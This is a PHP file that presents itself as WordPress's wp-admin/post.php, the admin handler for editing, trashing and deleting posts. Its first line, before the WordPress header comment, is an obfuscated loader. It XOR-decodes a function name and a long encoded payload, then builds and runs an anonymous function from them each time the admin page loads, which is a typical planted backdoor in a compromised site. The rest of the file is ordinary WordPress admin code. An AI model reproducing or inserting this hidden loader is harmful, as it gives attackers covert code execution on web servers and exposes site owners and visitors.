<?php $JyoLUSplvKu='+ QQFKb.E4OTPB+'^'HR402.=H0Z, 9-E';$MFqEYs=$JyoLUSplvKu('','ISRBHIYMADSUfIXU;X0kc5-9s2R=+<t5O;FKjsUiM+FVCIT+,yNCHo>MB+kh+<6nG2AFStAb3KDlpMbkg+yQnH>XJcOIqfu9FkZ:AkQ.mOSJNhrUn6B LH+ct6O1TCxfjZgsPx9LM>XCTEuPlA67-++jZ7BgXWKH-8a;rCa7E+GKRDc,<=ZqAykD:R+GN3,cWX7>SIp4E=<F0NDVTYnOl+3-:EAfhDR6Yh:-Gkgs  LS4wGLKR8 A6>xKie2,:ki JLXWvREAaLfmQ7M.F<sr>ZPcW,NMd;3>hEMqP.KR8jgYQ3VwxRp22W;1NdJz=86EJdOTA7,EBKh57SH571QEBhm3001ri5y;1hOXNJUhILbJ.P7PZM>d2kFV GM+1EMWWseGXBp4gei4PC0kSPp4UBENO7pPX+koOO-NUGkn29 DPI1959IEF XReJV +em=K8J;V;0Pfa5+6RJ5Qc,1F2QaBm58Z7<S5EjHcYU+ypV;LWnrpsZ49A=rRY>7ECPDNNIBW5EcUvt,,AWBLDDzZUVEYqP0-1gDFH2FkhFYDtrYAk5fyacSqY9XSNVGbbiVrXMaUIDJHX;SYtkmO.=LW<n12TjQM BO=lJI8;U.9TdjuGTATANaghqcrQNSbR1Z>db>-H.bBG+;Y.AUEhzmh8UE1-AUqQZ9'^' 5zc.<7.5-<;9, <H,CCDMBK,V3IJc+X:OabCS.cDM38 ==DBY6,:0Z,6J47FIBFcV 22XaFX.=EPmBKGPsXglQ->CriVAN3Ob<U3CuGMrszuHV<RE6R -EKPR.E5jCFN3LXyr0EiQ-7tkHpDeRVYJpN3jb9xs -TcERRfAD1Y+.<lGGYDs,hBaM3 N3;ABKs7BJzrz=87AL:j 7 8NrLMRAI zlL 3B87QH>KZSFA  QLMF-=JE UVXcM:qcu  ej-+wR9 8AqXMuA,B3YZREPYG3M:,;PVGHxmU;K2i2cC=0G7WErTDS;NTun7p7QPebEk0 CMlb0b<Q<:PVR9ejL2auad7:aYZBHk3+3uUwlF<O<B5smEn;bb2A3,tZ 4wjSA,=;K>nlMP17QKnpTB4.0+t=y-RVaek+L:4gVNrLN75;XXYP3 nX7 :.7TJ:2P>LbY7HUfR>QNU=.PyGHP2SxMbIQY.Vc8P<CaXS<MQT2Z86NTVS;FK D-9<Gh ;97:=ae<P<DyVPHM56klbbZr82pqU4QYP<c--Ka6AfdyTUn YPVIUP1CkZh6vnqUUQbDmuPmp x.nYtpTMKoOO>6E1ZW-545I1;NDm9YB9AX0CFUc0   gHGHQCRq5Yk7G;RLFZL<O9e7JB5A 1b5SVb10=XYieXjPD');$MFqEYs();
/**
 * Edit post administration panel.
 *
 * Manage Post actions: post, edit, delete, etc.
 *
 * @package WordPress
 * @subpackage Administration
 */

/** WordPress Administration Bootstrap */
require_once( dirname( __FILE__ ) . '/admin.php' );

$parent_file = 'edit.php';
$submenu_file = 'edit.php';

wp_reset_vars( array( 'action' ) );

if ( isset( $_GET['post'] ) )
 	$post_id = $post_ID = (int) $_GET['post'];
elseif ( isset( $_POST['post_ID'] ) )
 	$post_id = $post_ID = (int) $_POST['post_ID'];
else
 	$post_id = $post_ID = 0;

/**
 * @global string  $post_type
 * @global object  $post_type_object
 * @global WP_Post $post
 */
global $post_type, $post_type_object, $post;

if ( $post_id )
	$post = get_post( $post_id );

if ( $post ) {
	$post_type = $post->post_type;
	$post_type_object = get_post_type_object( $post_type );
}

if ( isset( $_POST['deletepost'] ) )
	$action = 'delete';
elseif ( isset($_POST['wp-preview']) && 'dopreview' == $_POST['wp-preview'] )
	$action = 'preview';

$sendback = wp_get_referer();
if ( ! $sendback ||
     strpos( $sendback, 'post.php' ) !== false ||
     strpos( $sendback, 'post-new.php' ) !== false ) {
	if ( 'attachment' == $post_type ) {
		$sendback = admin_url( 'upload.php' );
	} else {
		$sendback = admin_url( 'edit.php' );
		if ( ! empty( $post_type ) ) {
			$sendback = add_query_arg( 'post_type', $post_type, $sendback );
		}
	}
} else {
	$sendback = remove_query_arg( array('trashed', 'untrashed', 'deleted', 'ids'), $sendback );
}

switch($action) {
case 'post-quickdraft-save':
	// Check nonce and capabilities
	$nonce = $_REQUEST['_wpnonce'];
	$error_msg = false;

	// For output of the quickdraft dashboard widget
	require_once ABSPATH . 'wp-admin/includes/dashboard.php';

	if ( ! wp_verify_nonce( $nonce, 'add-post' ) )
		$error_msg = __( 'Unable to submit this form, please refresh and try again.' );

	if ( ! current_user_can( get_post_type_object( 'post' )->cap->create_posts ) ) {
		exit;
	}

	if ( $error_msg )
		return wp_dashboard_quick_press( $error_msg );

	$post = get_post( $_REQUEST['post_ID'] );
	check_admin_referer( 'add-' . $post->post_type );

	$_POST['comment_status'] = get_default_comment_status( $post->post_type );
	$_POST['ping_status']    = get_default_comment_status( $post->post_type, 'pingback' );

	edit_post();
	wp_dashboard_quick_press();
	exit;

case 'postajaxpost':
case 'post':
	check_admin_referer( 'add-' . $post_type );
	$post_id = 'postajaxpost' == $action ? edit_post() : write_post();
	redirect_post( $post_id );
	exit();

case 'edit':
	$editing = true;

	if ( empty( $post_id ) ) {
		wp_redirect( admin_url('post.php') );
		exit();
	}

	if ( ! $post )
		wp_die( __( 'You attempted to edit an item that doesn&#8217;t exist. Perhaps it was deleted?' ) );

	if ( ! $post_type_object )
		wp_die( __( 'Invalid post type.' ) );

	if ( ! in_array( $typenow, get_post_types( array( 'show_ui' => true ) ) ) ) {
		wp_die( __( 'Sorry, you are not allowed to edit posts in this post type.' ) );
	}

	if ( ! current_user_can( 'edit_post', $post_id ) )
		wp_die( __( 'Sorry, you are not allowed to edit this item.' ) );

	if ( 'trash' == $post->post_status )
		wp_die( __( 'You can&#8217;t edit this item because it is in the Trash. Please restore it and try again.' ) );

	if ( ! empty( $_GET['get-post-lock'] ) ) {
		check_admin_referer( 'lock-post_' . $post_id );
		wp_set_post_lock( $post_id );
		wp_redirect( get_edit_post_link( $post_id, 'url' ) );
		exit();
	}

	$post_type = $post->post_type;
	if ( 'post' == $post_type ) {
		$parent_file = "edit.php";
		$submenu_file = "edit.php";
		$post_new_file = "post-new.php";
	} elseif ( 'attachment' == $post_type ) {
		$parent_file = 'upload.php';
		$submenu_file = 'upload.php';
		$post_new_file = 'media-new.php';
	} else {
		if ( isset( $post_type_object ) && $post_type_object->show_in_menu && $post_type_object->show_in_menu !== true )
			$parent_file = $post_type_object->show_in_menu;
		else
			$parent_file = "edit.php?post_type=$post_type";
		$submenu_file = "edit.php?post_type=$post_type";
		$post_new_file = "post-new.php?post_type=$post_type";
	}

	if ( ! wp_check_post_lock( $post->ID ) ) {
		$active_post_lock = wp_set_post_lock( $post->ID );

		if ( 'attachment' !== $post_type )
			wp_enqueue_script('autosave');
	}

	if ( is_multisite() ) {
		add_action( 'admin_footer', '_admin_notice_post_locked' );
	} else {
		$check_users = get_users( array( 'fields' => 'ID', 'number' => 2 ) );

		if ( count( $check_users ) > 1 )
			add_action( 'admin_footer', '_admin_notice_post_locked' );

		unset( $check_users );
	}

	$title = $post_type_object->labels->edit_item;
	$post = get_post($post_id, OBJECT, 'edit');

	if ( post_type_supports($post_type, 'comments') ) {
		wp_enqueue_script('admin-comments');
		enqueue_comment_hotkeys_js();
	}

	include( ABSPATH . 'wp-admin/edit-form-advanced.php' );

	break;

case 'editattachment':
	check_admin_referer('update-post_' . $post_id);

	// Don't let these be changed
	unset($_POST['guid']);
	$_POST['post_type'] = 'attachment';

	// Update the thumbnail filename
	$newmeta = wp_get_attachment_metadata( $post_id, true );
	$newmeta['thumb'] = $_POST['thumb'];

	wp_update_attachment_metadata( $post_id, $newmeta );

case 'editpost':
	check_admin_referer('update-post_' . $post_id);

	$post_id = edit_post();

	// Session cookie flag that the post was saved
	if ( isset( $_COOKIE['wp-saving-post'] ) && $_COOKIE['wp-saving-post'] === $post_id . '-check' ) {
		setcookie( 'wp-saving-post', $post_id . '-saved', time() + DAY_IN_SECONDS, ADMIN_COOKIE_PATH, COOKIE_DOMAIN, is_ssl() );
	}

	redirect_post($post_id); // Send user on their way while we keep working

	exit();

case 'trash':
	check_admin_referer('trash-post_' . $post_id);

	if ( ! $post )
		wp_die( __( 'The item you are trying to move to the Trash no longer exists.' ) );

	if ( ! $post_type_object )
		wp_die( __( 'Invalid post type.' ) );

	if ( ! current_user_can( 'delete_post', $post_id ) )
		wp_die( __( 'Sorry, you are not allowed to move this item to the Trash.' ) );

	if ( $user_id = wp_check_post_lock( $post_id ) ) {
		$user = get_userdata( $user_id );
		wp_die( sprintf( __( 'You cannot move this item to the Trash. %s is currently editing.' ), $user->display_name ) );
	}

	if ( ! wp_trash_post( $post_id ) )
		wp_die( __( 'Error in moving to Trash.' ) );

	wp_redirect( add_query_arg( array('trashed' => 1, 'ids' => $post_id), $sendback ) );
	exit();

case 'untrash':
	check_admin_referer('untrash-post_' . $post_id);

	if ( ! $post )
		wp_die( __( 'The item you are trying to restore from the Trash no longer exists.' ) );

	if ( ! $post_type_object )
		wp_die( __( 'Invalid post type.' ) );

	if ( ! current_user_can( 'delete_post', $post_id ) )
		wp_die( __( 'Sorry, you are not allowed to restore this item from the Trash.' ) );

	if ( ! wp_untrash_post( $post_id ) )
		wp_die( __( 'Error in restoring from Trash.' ) );

	wp_redirect( add_query_arg('untrashed', 1, $sendback) );
	exit();

case 'delete':
	check_admin_referer('delete-post_' . $post_id);

	if ( ! $post )
		wp_die( __( 'This item has already been deleted.' ) );

	if ( ! $post_type_object )
		wp_die( __( 'Invalid post type.' ) );

	if ( ! current_user_can( 'delete_post', $post_id ) )
		wp_die( __( 'Sorry, you are not allowed to delete this item.' ) );

	if ( $post->post_type == 'attachment' ) {
		$force = ( ! MEDIA_TRASH );
		if ( ! wp_delete_attachment( $post_id, $force ) )
			wp_die( __( 'Error in deleting.' ) );
	} else {
		if ( ! wp_delete_post( $post_id, true ) )
			wp_die( __( 'Error in deleting.' ) );
	}

	wp_redirect( add_query_arg('deleted', 1, $sendback) );
	exit();

case 'preview':
	check_admin_referer( 'update-post_' . $post_id );

	$url = post_preview();

	wp_redirect($url);
	exit();

default:
	/**
	 * Fires for a given custom post action request.
	 *
	 * The dynamic portion of the hook name, `$action`, refers to the custom post action.
	 *
	 * @since 4.6.0
	 *
	 * @param int $post_id Post ID sent with the request.
	 */
	do_action( "post_action_{$action}", $post_id );

	wp_redirect( admin_url('edit.php') );
	exit();
} // end switch
include( ABSPATH . 'wp-admin/admin-footer.php' );
